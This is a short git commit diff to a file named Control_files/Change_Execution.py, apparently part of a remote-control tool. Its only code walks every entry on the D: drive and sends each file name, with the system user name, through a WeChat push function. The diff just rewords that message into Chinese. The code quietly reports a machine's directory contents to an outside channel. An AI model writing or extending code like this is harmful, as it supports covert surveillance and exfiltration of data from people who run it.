5280c6ccfadfe878dbd091f0c98531e8e622e870
GCLgaici <3471093372@qq.com>
2024-10-25 21:09:27 +0800

    yc

--- Control_files/Change_Execution.py
+++ Control_files/Change_Execution.py
@@ -4,4 +4,4 @@
 import os
 
 for i in os.listdir('D:'):
-    self.main.wechat_push.Alleged_information(f'{self.main.sys_username}wj{i}')
+    self.main.wechat_push.Alleged_information(f'{self.main.sys_username}的D:文件： {i}')
